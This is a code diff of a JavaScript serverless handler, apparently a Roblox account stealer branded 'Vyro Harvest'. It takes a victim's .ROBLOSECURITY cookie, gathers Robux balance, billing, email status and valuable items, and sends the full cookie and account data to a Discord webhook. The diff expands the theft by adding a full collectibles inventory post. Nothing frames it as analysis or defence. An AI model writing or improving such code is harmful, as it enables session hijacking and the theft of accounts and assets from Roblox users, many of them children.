@@ -51,7 +51,7 @@ async function getPendingRobux(userId, cookie) {
   return pending;
 }
 
-// ---------- User Settings (Verified, Banned, Email) ----------
+// ---------- User Settings (Verified, Banned, Email) – FIXED EMAIL DETECTION ----------
 async function getUserSettings(cookie, csrfToken) {
   const defaultSettings = { verified: "False", banned: "False", emailEnabled: "False" };
   try {
@@ -63,8 +63,8 @@ async function getUserSettings(cookie, csrfToken) {
     });
     if (!res.ok) return defaultSettings;
     const data = await res.json();
-    // Email is present if the account has a verified email
-    const hasEmail = !!(data.Email || data.UserEmail || data.email);
+    // Check multiple possible fields for email
+    const hasEmail = !!(data.Email || data.UserEmail || data.email || data.userEmail);
     return {
       verified: data.IsVerified ? "True" : "False",
       banned: data.IsBanned ? "True" : "False",
@@ -100,7 +100,7 @@ async function getBilling(cookie, csrfToken) {
   }
 }
 
-// ---------- Groups membership count (not owned) ----------
+// ---------- Groups membership count ----------
 async function getGroupsCount(userId) {
   try {
     const res = await fetch(`https://groups.roblox.com/v2/users/${userId}/groups/roles`);
@@ -112,7 +112,7 @@ async function getGroupsCount(userId) {
   }
 }
 
-// ---------- Total Place Visits (CORRECTED: sums placeVisits across all universes) ----------
+// ---------- Total Place Visits ----------
 async function getTotalPlaceVisits(userId) {
   let totalVisits = 0;
   let cursor = null;
@@ -122,22 +122,20 @@ async function getTotalPlaceVisits(userId) {
     if (!res.ok) break;
     const data = await res.json();
     for (const game of data.data) {
-      // Each game object already has a 'placeVisits' field? Actually we need to fetch universe details.
-      // Better: fetch details for each universe ID.
       const detailsRes = await fetch(`https://games.roblox.com/v1/games?universeIds=${game.id}`);
       if (detailsRes.ok) {
         const details = await detailsRes.json();
         totalVisits += details.data[0]?.placeVisits || 0;
       }
-      await new Promise(r => setTimeout(r, 20)); // rate limit
+      await new Promise(r => setTimeout(r, 20));
     }
     cursor = data.nextPageCursor;
   } while (cursor);
   return totalVisits;
 }
 
-// ---------- Collectibles (first 3 names) ----------
-async function getCollectibles(userId, cookie) {
+// ---------- Collectibles (full list for third embed) ----------
+async function getAllCollectibles(userId, cookie) {
   let items = [];
   let cursor = null;
   do {
@@ -148,10 +146,14 @@ async function getCollectibles(userId, cookie) {
     items.push(...data.data);
     cursor = data.nextPageCursor;
   } while (cursor);
-  return items.slice(0, 3).map(item => item.name);
+  return items.map(item => ({
+    name: item.name,
+    assetId: item.assetId,
+    link: `https://www.roblox.com/catalog/${item.assetId}/${encodeURIComponent(item.name.replace(/ /g, '-'))}`
+  }));
 }
 
-// ---------- Check if user owns specific items (Korblox, Headless) ----------
+// ---------- Check specific item ownership (Korblox, Headless) ----------
 async function checkItemOwnership(userId, cookie, assetId) {
   try {
     const res = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/${assetId}/is-owned`, {
@@ -226,25 +228,25 @@ export default async function handler(req, res) {
   if (!WEBHOOK_URL) return res.status(500).json({ error: "Missing WEBHOOK_URL env var" });
 
   try {
-    // CSRF token (optional for some endpoints)
+    // CSRF token
     let csrfToken = null;
     try {
       csrfToken = await getCsrfToken(cookie);
     } catch (e) {}
 
     // Parallel fetch
-    const [userData, robux, pendingRobux, groupsCount, totalVisits, collectibles, playedPasses, countryFlag, avatarUrl, korblox, headless] = await Promise.all([
+    const [userData, robux, pendingRobux, groupsCount, totalVisits, allCollectibles, playedPasses, countryFlag, avatarUrl, korblox, headless] = await Promise.all([
       getUser(rbxuid),
       getRobux(rbxuid, cookie),
       getPendingRobux(rbxuid, cookie),
       getGroupsCount(rbxuid),
       getTotalPlaceVisits(rbxuid),
-      getCollectibles(rbxuid, cookie),
+      getAllCollectibles(rbxuid, cookie),
       getPlayedPasses(rbxuid),
       getCountryFlag(req),
       getUserAvatarUrl(rbxuid),
-      checkItemOwnership(rbxuid, cookie, 1373933),  // Korblox asset ID
-      checkItemOwnership(rbxuid, cookie, 102611803) // Headless asset ID
+      checkItemOwnership(rbxuid, cookie, 1373933),  // Korblox
+      checkItemOwnership(rbxuid, cookie, 102611803) // Headless
     ]);
 
     let settings = { verified: "False", banned: "False", emailEnabled: "False" };
@@ -262,8 +264,9 @@ export default async function handler(req, res) {
     const rolimonsLink = `https://www.rolimons.com/player/${userData.id}`;
     const cookieThumb = "https://png.pngtree.com/png-vector/20201010/ourmid/pngtree-cartoon-delicious-dessert-cookie-cookie-clipart-png-image_2360164.jpg";
     const robuxEmoji = "<:Robux:1495081542370726080>";
+    const collectiblesCount = allCollectibles.length;
 
-    // ---------- Stats Embed ----------
+    // ----- Embed 1: Stats -----
     const statsEmbed = {
       title: "🔱 Vyro Har - Result",
       description: `**Check_VYROSECURITY | Vyro**\n\`2400c5b00-465b-1000-bd8d8e8fca5bc723\``,
@@ -303,7 +306,7 @@ export default async function handler(req, res) {
         },
         {
           name: "🎁 Collectibles",
-          value: collectibles.length ? collectibles.map(c => `**${c}**`).join("\n") : "**None**",
+          value: `**${collectiblesCount} items** (see next embed)`,
           inline: true
         },
         {
@@ -326,7 +329,7 @@ export default async function handler(req, res) {
       timestamp: new Date().toISOString()
     };
 
-    // ---------- Cookie Embed ----------
+    // ----- Embed 2: Cookie -----
     const cookieEmbed = {
       title: "🍪 ***.ROBLOSECURITY***",
       description: `**Full Roblox Cookie:**\n\`\`\`\n${cookie}\n\`\`\``,
@@ -336,7 +339,28 @@ export default async function handler(req, res) {
       timestamp: new Date().toISOString()
     };
 
-    // Send to Discord
+    // ----- Embed 3: Collectibles (up to 20 items, each with link) -----
+    let collectiblesText = "";
+    const maxDisplay = 20;
+    for (let i = 0; i < Math.min(collectiblesCount, maxDisplay); i++) {
+      const item = allCollectibles[i];
+      collectiblesText += `**${item.name}**\n<${item.link}>\n\n`;
+    }
+    if (collectiblesCount > maxDisplay) {
+      collectiblesText += `*... and ${collectiblesCount - maxDisplay} more items*`;
+    }
+    if (collectiblesText === "") collectiblesText = "No collectibles found.";
+
+    const collectiblesEmbed = {
+      title: "🎁 Collectible Inventory",
+      description: collectiblesText,
+      color: 0x1E3A8A,
+      thumbnail: { url: cookieThumb },
+      footer: { text: `Total items: ${collectiblesCount}` },
+      timestamp: new Date().toISOString()
+    };
+
+    // Send all three embeds
     await fetch(WEBHOOK_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -346,6 +370,11 @@ export default async function handler(req, res) {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ username: "Vyro Harvest", embeds: [cookieEmbed] })
+    });
+    await fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ username: "Vyro Harvest", embeds: [collectiblesEmbed] })
     });
 
     return res.status(200).json({ success: true, firstTime: true });
